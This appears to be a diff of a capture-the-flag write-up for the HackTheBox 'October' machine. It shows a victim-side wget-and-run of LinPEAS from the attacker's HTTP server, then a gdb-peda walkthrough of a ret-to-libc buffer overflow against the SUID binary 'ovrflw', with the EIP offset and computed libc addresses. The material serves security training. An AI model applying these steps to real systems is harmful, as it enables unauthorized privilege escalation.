@@ -149,47 +149,14 @@ www-data
 Now, let’s use [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/download/20220417/linpeas.sh) to help us identify the possible vulnerabilities.
 
 ```bash
-- Local machine -
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
-└─# ls
-linpeas.sh  revshell.php5
-                                             
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
-└─# python3 -m http.server 80                                
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-
-- Victim machine -
 $ cd /tmp
 $ wget http://10.10.14.11/linpeas.sh
 $ chmod +x linpeas.sh
 $ ./linpeas.sh 
 ...
-                                         ╔═══════════════════╗
-═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════
-                                         ╚═══════════════════╝
 ╔══════════╣ SUID - Check easy privesc, exploits and write perms
 ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
--rwsr-xr-x 1 root root 67K Nov 24  2016 /bin/umount  --->  BSD/Linux(08-1996)
--rwsr-xr-x 1 root root 39K May  8  2014 /bin/ping
--rwsr-xr-x 1 root root 30K May 15  2015 /bin/fusermount
--rwsr-xr-x 1 root root 35K May 17  2017 /bin/su
--rwsr-xr-x 1 root root 43K May  8  2014 /bin/ping6
--rwsr-xr-x 1 root root 87K Nov 24  2016 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
--rwsr-xr-x 1 root root 5.4K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
--rwsr-xr-x 1 root root 482K Aug 11  2016 /usr/lib/openssh/ssh-keysign
--rwsr-xr-x 1 root root 9.6K Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
--rwsr-xr-- 1 root messagebus 327K Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
--rwsr-xr-x 1 root root 154K Oct 14  2016 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
--rwsr-xr-x 1 root root 31K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
--rwsr-xr-x 1 root root 18K Nov 24  2015 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
--rwsr-xr-x 1 root root 45K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
--rwsr-xr-x 1 root root 44K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
--rwsr-xr-x 1 root root 65K May 17  2017 /usr/bin/gpasswd
--rwsr-xr-x 1 root root 18K May  8  2014 /usr/bin/traceroute6.iputils
--rwsr-xr-x 1 root root 72K Oct 21  2013 /usr/bin/mtr
--rwsr-xr-x 1 root root 36K May 17  2017 /usr/bin/chsh
--rwsr-sr-x 1 daemon daemon 46K Oct 21  2013 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
--rwsr-xr-- 1 root dip 316K Apr 21  2015 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+...
 -rwsr-sr-x 1 libuuid libuuid 18K Nov 24  2016 /usr/sbin/uuidd
 -rwsr-xr-x 1 root root 7.3K Apr 21  2017 /usr/local/bin/ovrflw (Unknown SUID binary)
 ...
@@ -201,21 +168,14 @@ $ ./linpeas.sh
 $ find / -perm -4000 2>/dev/null
 ...
 /usr/local/bin/ovrflw
+
 $ find / -perm /4000 2>/dev/null
 ...
 /usr/local/bin/ovrflw
 ```
 
->   find / -perm -4000: finding all files with SUID permissions under root
->
->   2>/dev/null: redirect error away
-
-Notice that there is a file with unknown SUID binary set called `ovrflw`. Let’s check it out!
-
 ```bash
-$ cd /usr/local/bin 
-
-$ ls
+$ ls /usr/local/bin 
 ovrflw
 
 $ file ovrflw
@@ -254,7 +214,7 @@ Syntax: ./ovrflw <input string>
 zsh: segmentation fault  ./ovrflw $(python -c 'print "A"*6969')
 ```
 
-Let’s debug this program using [`gdb-peda`](https://github.com/longld/peda)!
+Let’s debug this program using [`gdb-peda`](https://github.com/longld/peda).
 
 >   Note: if `gdb-peda` is not working properly, update your `gdb` with `sudo apt-get install gdb -y`
 
@@ -275,20 +235,26 @@ PIE       : disabled
 RELRO     : Partial
 ```
 
-As NX is enabled, we cannot put a shellcode inside the program. Therefore, we need to make use of `ret-to-libc` to exploit this.
-
-First, we need to try and offset the `EIP`.
+As `NX` is enabled, we won’t be able to put a shellcode inside the program. Therefore, we need to make use of `ret-to-libc` to exploit this. First, we need to try and offset the `EIP`.
 
 ```bash
+# Create a unique pattern of 150 bytes
 gdb-peda$ pattern_create 150
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
+
+# Set our input string to the unique pattern 
 gdb-peda$ pset arg 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
+
 gdb-peda$ pshow arg
 arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
+
 gdb-peda$ run
 Starting program: /home/shiro/HackTheBox/October/ovrflw 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
+
+# Set breakpoint at main function
 gdb-peda$ break main
 Breakpoint 1 at 0x8048480
+
 gdb-peda$ run
 Starting program: /home/shiro/HackTheBox/October/ovrflw 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
 [----------------------------------registers-----------------------------------]
@@ -359,8 +325,11 @@ Stopped reason: SIGSEGV
 Nice, the `EIP` was overwritten. Let’s find the exact number of bytes needed to offset it.
 
 ```bash
+# Find the EIP offset
 gdb-peda$ pattern_offset AA8A
 1094205761 found at offset: 112
+
+# Find the EIP address offset
 gdb-peda$ pattern_offset 0x41384141 150
 1094205761 found at offset: 112
 ```
@@ -368,6 +337,7 @@ gdb-peda$ pattern_offset 0x41384141 150
 Let’s do a sanity check that we found the correct number of bytes.
 
 ```bash
+# create a 112 bytes long of A and then add BCDE
 gdb-peda$ run `python -c 'print "A"*112 + "BCDE"'`
 Starting program: /home/shiro/HackTheBox/October/ovrflw `python -c 'print "A"*112 + "BCDE"'`
 [----------------------------------registers-----------------------------------]
@@ -435,7 +405,7 @@ Stopped reason: SIGSEGV
 0x45444342 in ?? ()
 ```
 
-Awesome, now we have to find the address of `system`, `exit` and `/bin/sh` to complete the exploit.
+Now we just have to find the address of `system`, `exit` and `/bin/sh` to complete the exploit.
 
 ##### First method
 
@@ -460,8 +430,11 @@ $ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
 Then we can just [calculate](https://www.gigacalculator.com/calculators/hexadecimal-calculator.php) the address for each function.
 
 ```bash
+# hex of libc.so.6 + hex of system
 system: 0xb75b5000 + 0x40310 = 0xb75f5310
+# hex of libc.so.6 + hex of exit
 exit: 0xb75b5000 + 0x33260 = 0xb75e8260
+# hex of libc.so.6 + hex of bin/sh
 "/bin/sh": 0xb75b5000 + 0x162bac = 0xb7717bac
 ```
 
